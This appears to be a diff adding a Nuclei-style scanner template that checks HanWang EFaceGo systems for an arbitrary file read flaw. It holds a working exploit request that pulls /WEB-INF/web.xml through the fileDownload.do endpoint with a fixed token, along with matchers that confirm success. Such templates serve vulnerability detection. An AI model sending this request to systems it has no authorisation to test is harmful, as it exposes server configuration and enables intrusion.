@@ -1,0 +1,28 @@
+id: HanWangEFaceGo-fileDownload-ReadAnyFile
+
+info:
+  name: HanWangEFaceGo-fileDownload-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: |
+    HanWangEFaceGo-fileDownload-ReadAnyFile.
+
+http:
+  - raw:
+      - |
+        GET /manage/personnel/fileDownload.do?fileId=/WEB-INF/web.xml&recoToken=ZuZBOrvLG8M HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - ?xml version="1.0"
+          - <context-param
+        condition: and
+
+      - type: status
+        status:
+          - 200
